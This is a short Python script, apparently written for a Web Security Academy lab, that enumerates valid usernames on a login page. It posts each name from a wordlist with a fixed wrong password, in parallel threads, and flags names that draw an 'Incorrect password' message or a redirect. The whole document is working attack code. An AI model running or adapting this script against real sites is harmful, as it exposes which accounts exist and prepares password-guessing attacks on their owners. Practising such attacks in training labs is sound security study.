python3 - <<'EOF'
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

base_url = "https://0a20001503bda4858045fdbf00590076.web-security-academy.net"

with open("C:/Users/malik/Downloads/usernames.txt") as f:
    usernames = [line.strip() for line in f]

def check(username):
    r = requests.post(
        f"{base_url}/login",
        data={"username": username, "password": "wrongpassword"},
        allow_redirects=False
    )
    if "Incorrect password" in r.text:
        return f"[FOUND] {username}"
    elif r.status_code == 302:
        return f"[302 LOGIN] {username}"
    return None

with ThreadPoolExecutor(max_workers=10) as ex:
    futures = {ex.submit(check, u): u for u in usernames}
    for f in as_completed(futures):
        result = f.result()
        if result:
            print(result)
EOF
